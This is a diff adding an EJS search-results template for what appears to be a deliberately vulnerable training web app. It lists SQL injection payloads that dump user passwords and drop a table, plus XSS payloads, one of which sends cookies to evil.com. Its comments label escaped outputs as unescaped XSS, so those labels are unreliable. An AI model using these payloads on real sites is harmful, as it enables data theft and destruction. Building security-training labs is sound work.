@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Search Results - Vulnerable Restaurant</title>
+  <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1>🍕 Search Results</h1>
+      <nav>
+        <a href="/">Home</a>
+        <a href="/menu">Menu</a>
+        <% if (user) { %>
+          <a href="/orders">Orders</a>
+          <a href="/logout">Logout</a>
+        <% } else { %>
+          <a href="/login">Login</a>
+        <% } %>
+      </nav>
+    </header>
+
+    <main>
+      <!-- VULNERABILITY: Search term displayed without encoding (XSS) -->
+      <h2>Search Results for: "<%= searchTerm %>"</h2>
+
+      <div class="search-box">
+        <form method="GET" action="/search">
+          <input type="text" name="q" value="<%= searchTerm %>" placeholder="Search menu items...">
+          <button type="submit">Search</button>
+        </form>
+      </div>
+
+      <% if (results.length > 0) { %>
+        <div class="menu-grid">
+          <% results.forEach(item => { %>
+            <div class="menu-item">
+              <!-- VULNERABILITY: XSS - content not escaped -->
+              <h3><%= item.name %></h3>
+              <p class="description"><%= item.description %></p>
+              <p class="price">$<%= item.price.toFixed(2) %></p>
+            </div>
+          <% }); %>
+        </div>
+      <% } else { %>
+        <p>No items found matching your search.</p>
+      <% } %>
+
+      <div class="vulnerability-hints">
+        <h3>💡 SQL Injection in Search:</h3>
+        <p>Try these search queries:</p>
+        <ul>
+          <li><code>' OR '1'='1</code> - Returns all items</li>
+          <li><code>' UNION SELECT id,username,password,1 FROM users--</code> - Extract user data</li>
+          <li><code>'; DROP TABLE menu_items;--</code> - Destructive (be careful!)</li>
+        </ul>
+        <h3>💡 XSS in Search:</h3>
+        <ul>
+          <li><code>&lt;script&gt;alert('XSS from search')&lt;/script&gt;</code></li>
+          <li><code>&lt;img src=x onerror=document.location='http://evil.com/steal?cookie='+document.cookie&gt;</code></li>
+        </ul>
+      </div>
+    </main>
+
+    <footer>
+      <p>For educational purposes only.</p>
+    </footer>
+  </div>
+</body>
+</html>
